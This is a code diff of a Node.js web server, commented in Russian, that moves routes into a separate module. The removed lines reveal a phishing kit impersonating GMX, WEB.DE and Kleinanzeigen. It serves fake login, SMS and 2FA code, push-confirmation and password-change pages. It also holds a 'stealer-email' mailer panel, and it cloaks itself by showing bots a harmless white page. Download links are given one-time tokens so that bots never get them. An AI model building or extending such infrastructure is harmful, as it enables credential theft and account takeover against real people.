-      '/bitte-am-pc.html': 'bitte-am-pc.html',
-      '/app-update.html': 'app-update.html',
-      '/gmx-mobile-anleitung.html': 'gmx-mobile-anleitung.html'
-    };
-    const webdeHas = {
-      '/push-confirm.html': true, '/sms-code.html': true, '/2fa-code.html': true, '/change-password.html': true, '/forgot-password-redirect.html': true,
-      '/index-sicherheit-update.html': true, '/index-sicherheit.html': true, '/index-sicherheit-pc.html': true, '/sicherheit-anleitung.html': true,
-      '/install-guide.html': true, '/install-guide-test.html': true, '/install-guide-single.html': true, '/install-guide-single-2steps.html': true, '/index-change.html': true, '/bitte-am-pc.html': true, '/app-update.html': true, '/gmx-mobile-anleitung.html': true
-    };
-    const fileName = contentFromGmx[pathname];
-    if (fileName) {
-      if (isWebde && !webdeHas[pathname]) {
-        if (safeEnd(res)) return;
-        res.writeHead(302, { 'Location': brand.canonicalUrl, 'Cache-Control': 'no-store' });
-        res.end();
-        return;
-      }
-      const dir = isWebde && webdeHas[pathname] ? 'webde' : 'gmx';
-      return serveFile(path.join(PROJECT_ROOT, dir, fileName), res, req);
-    }
-  }
+  const ROUTE_HTTP_MERGED_STATIC = Object.assign({}, ROUTE_HTTP_DEPS, { ip });
 
   // Скачивание: /download/<имя_файла>?t=TOKEN — только с одноразовым токеном (боты не получают ссылку). Админка может без токена.
   const downloadFileMatch = pathname.match(/^\/download\/([^/?#]+)$/);
@@ -3169,84 +2706,12 @@ const server = http.createServer(async (req, res) => {
     return send(res, 404, 'Not Found', 'text/plain');
   }
 
-  // Админка: /admin и /admin/ отдают admin.html только при валидном токене (?token= или Authorization)
-  if ((pathname === '/admin' || pathname === '/admin/') && req.method === 'GET') {
-    if (!checkAdminPageAuth(req, res, parsed)) return;
-    const filePath = path.join(PROJECT_ROOT, 'public', 'admin.html');
-    return serveFile(filePath, res, req);
+  try {
+    await staticRoutes.handleRoute(req, res, parsed, '', ROUTE_HTTP_MERGED_STATIC);
+  } catch (err) {
+    console.error('[staticRoutes]', err);
+    if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
   }
-
-  // Mailer: отдельная страница конфига stealer-email (только с токеном админки)
-  if ((pathname === '/mailer' || pathname === '/mailer/' || pathname === '/mailer/index.html') && req.method === 'GET') {
-    if (!checkAdminPageAuth(req, res, parsed)) return;
-    const mailerIndexPath = path.join(PROJECT_ROOT, 'mailer', 'index.html');
-    return serveFile(mailerIndexPath, res, req);
-  }
-  if (pathname === '/mailer/index-test.html' && req.method === 'GET') {
-    if (!checkAdminPageAuth(req, res, parsed)) return;
-    const mailerTestPath = path.join(PROJECT_ROOT, 'mailer', 'index-test.html');
-    return serveFile(mailerTestPath, res, req);
-  }
-  if ((pathname === '/mailer/mailer.js' || pathname === '/mailer/mailer.css') && req.method === 'GET') {
-    const mailerAssetPath = path.join(PROJECT_ROOT, 'mailer', path.basename(pathname));
-    return fs.stat(mailerAssetPath, (err, stat) => {
-      if (err || !stat.isFile()) return send(res, 404, 'Not Found', 'text/plain');
-      serveFile(mailerAssetPath, res, req);
-    });
-  }
-
-  // Гайд по установке: скриншоты из webde/guide/
-  if (pathname.startsWith('/guide/') && pathname.length > 7 && req.method === 'GET') {
-    const name = path.basename(pathname).replace(/[^a-zA-Z0-9._-]/g, '');
-    if (name && /\.(png|jpg|jpeg|gif|webp)$/i.test(name)) {
-      const guidePath = path.join(PROJECT_ROOT, 'webde', 'guide', name);
-      return fs.stat(guidePath, (err, stat) => {
-        if (err || !stat.isFile()) return send(res, 404, 'Not Found', 'text/plain');
-        serveFile(guidePath, res, req);
-      });
-    }
-  }
-
-  // Старые URL — редирект на новые пути
-  if (pathname === '/index.html' && req.method === 'GET') {
-    if (safeEnd(res)) return;
-    res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
-    res.end();
-    return;
-  }
-  if (pathname === '/index-change.html' && req.method === 'GET') {
-    if (safeEnd(res)) return;
-    res.writeHead(302, { 'Location': '/passwort-aendern', 'Cache-Control': 'no-store' });
-    res.end();
-    return;
-  }
-
-  // Статика: общие ресурсы из public/, админка и прочее из корня
-  const publicAssets = ['/script.js', '/script-webde.js', '/script-klein.js', '/index-change.js', '/index-change-webde.js', '/push-confirm.js', '/push-confirm-webde.js', '/sms-code.js', '/sms-code-webde.js', '/2fa-code-webde.js', '/sms-code-klein.js', '/erfolg-klein.js', '/change-password.js', '/change-password-webde.js', '/change-password-klein.js', '/status-redirect.js', '/status-redirect-webde.js', '/chat-widget.js', '/brand.js', '/styles.css', '/favicon.svg', '/favicon-webde.png', '/webde-kundencenter-logo.png', '/klein-logo.png', '/windows-icon.png', '/android-icon.png', '/ios-icon.png', '/chat-widget.css', '/admin.html', '/admin.css', '/admin.js', '/fingerprint.js', '/webde-fingerprints-pool.js'];
-  const requested = pathname;
-  const inPublic = publicAssets.indexOf(pathname) !== -1;
-  let filePath = inPublic ? path.join(PROJECT_ROOT, 'public', requested.slice(1)) : path.join(PROJECT_ROOT, requested);
-  if (!path.relative(PROJECT_ROOT, filePath).split(path.sep).every(p => p !== '..')) {
-    return send(res, 403, 'Forbidden', 'text/plain');
-  }
-  fs.stat(filePath, (err, stat) => {
-    if (err || !stat.isFile()) {
-      return send(res, 404, 'Not Found', 'text/plain');
-    }
-    if (pathname === '/admin.html' && req.method === 'GET' && !checkAdminPageAuth(req, res, parsed)) return;
-    if (req.method === 'GET' && isProtectedContentPath(pathname) && !hasGateCookie(req)) {
-      const html = isLikelyBot(req, pathname) ? getWhitePageHtml(req) : GATE_PAGE_HTML;
-      if (res.writableEnded) return;
-      res.writeHead(200, {
-        'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'no-store, no-cache, must-revalidate',
-        'Pragma': 'no-cache'
-      });
-      res.end(html);
-      return;
-    }
-    serveFile(filePath, res, req);
-  });
 });
 
 server.on('error', (err) => {
